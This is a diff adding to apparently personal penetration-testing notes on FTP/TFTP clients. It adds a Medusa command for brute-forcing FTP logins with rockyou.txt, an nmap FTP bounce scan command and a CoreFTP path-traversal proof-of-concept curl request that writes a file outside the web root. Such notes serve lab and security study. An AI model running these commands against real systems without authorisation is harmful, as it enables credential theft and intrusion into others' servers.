@@ -24,6 +24,7 @@ COMMON FILE TRANSFER COMMANDS (ftp / tftp style)
 
 * connect   : Sets the remote host (and optionally port) for file transfers
 * get       : Transfer a file (or files) from remote host to local host
+* mget      : Transfer MULTIPLE files
 * put       : Transfer a file (or files) from local host to remote host
 * quit      : Exit the client
 * status    : Show current client status (mode, connection, timeout, etc.)
@@ -36,6 +37,32 @@ NOTES / TIPS
 * If anonymous is blocked, try common credentials or brute-force carefully and legally.
 * Understand whether commands refer to ftp or tftp clients as some syntax/behavior differs.
 
+
+BRUTE FORCING WITH MEDUSA
+(remember to use -t for multiple threads, otherwise it will just be doing 1-at-a-time)
+medusa -u username -P rockyou.txt -h <target-ip> -M ftp
+or for specific port
+medusa -u username -P rockyou.txt -h <target-ip> -M ftp -n <target-port>
+
+FTP BOUNCE ATTACK
+This type of attack uses FTP servers to deliver outbound traffic to the network;
+the attacker uses a PORT command to trick the FTP connection into running commands and getting information from a device other than the intended server.
+
+nmap can be used with -b:
+nmap -Pb -v -n -p80 -b anonymous:password@<intermediate-target-ip> <target-sender-ip>
+(if anonymous login is accepted, do anonymous@<inter...)
+
+
+CoreFTP EXPLOIT (PoC):
+curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
+
+
+
+
+!!! PASSIVE MODE !!!
+If you are being held up to use ls, then use:
+passive
+(this should disable passive mode and will stop the holdup)
 +------------------------------------------------------------------+
 |                          End of Notes                             |
 +------------------------------------------------------------------+
